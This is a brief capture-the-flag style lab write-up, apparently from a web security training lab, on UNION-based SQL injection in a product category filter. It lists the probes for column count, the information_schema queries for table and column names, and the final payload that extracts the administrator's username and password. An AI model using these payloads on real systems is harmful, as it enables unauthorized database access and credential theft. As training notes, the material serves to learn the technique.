Lab: SQL injection attack, listing the database contents on non-Oracle databases
Vuln : SQLi in product category filter.
Task : Retrive data from tables to get username and password of administrator.

' order by 1--  HTTP/2 200 OK
' order by 2--  HTTP/2 200 OK 
' order by 3--  HTTP/2 500 Internal Server Error

'+union+SELECT+table_name,null+FROM+information_schema.tables-- : return all table names.
table : users_smtvsv

'union+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name+%3d+'users_smtvsv'-- : username_oywtii and email

'+union++Select+username_oywtii,password_lvjwgs+from+users_smtvsv--
username : administrator
passoword: kzpn2ajzx6hfdqtjtt4g
